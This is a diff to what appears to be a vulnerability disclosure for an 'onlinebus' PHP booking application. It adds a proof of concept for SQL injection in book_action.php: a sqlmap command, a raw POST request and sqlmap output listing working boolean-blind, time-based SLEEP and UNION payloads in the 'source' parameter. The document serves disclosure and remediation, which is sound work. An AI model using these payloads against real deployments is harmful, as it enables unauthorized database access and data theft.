@@ -95,6 +95,49 @@ $sql_price="SELECT * FROM `price` WHERE `source` LIKE '$source' AND `dest` LIKE 
 
 Parameterized queries or precompiled statements should be used to ensure that user input is processed and escaped correctly. This can prevent attackers from tampering with query logic by injecting malicious code.
 
+
+POC：
+
+`sqlmap -r r.txt`
+
+```
+POST /onlinebus/book_action.php HTTP/1.1
+Host: 192.168.253.1
+Content-Length: 79
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://onlinebus
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.253.1/onlinebus/book.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=jmetab2u149tgvq0m6nh6mbeh9
+Connection: close
+
+source=Khandeshwar&dest=Kharghar&class=First&type=Single&number=1&login_submit=
+
+```
+
+![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/4a20d965-f61f-4b4e-b4d8-131f9b509def)
+
+```
+Parameter: source (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: source=Khandeshwar' AND 2150=2150 AND 'TWmp'='TWmp&dest=Kharghar&class=First&type=Single&number=1&login_submit=
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: source=Khandeshwar' AND (SELECT 8958 FROM (SELECT(SLEEP(5)))BoXn) AND 'yQdU'='yQdU&dest=Kharghar&class=First&type=Single&number=1&login_submit=
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: source=Khandeshwar' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71767a7a71,0x675173674473756647535654716b4c50656d7853664f56447278474941646e41576a496656456a64,0x71627a6a71)-- -&dest=Kharghar&class=First&type=Single&number=1&login_submit=
+
+```
+
 # 3. book_action.php Cross-site Scripting (XSS)
 
 CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
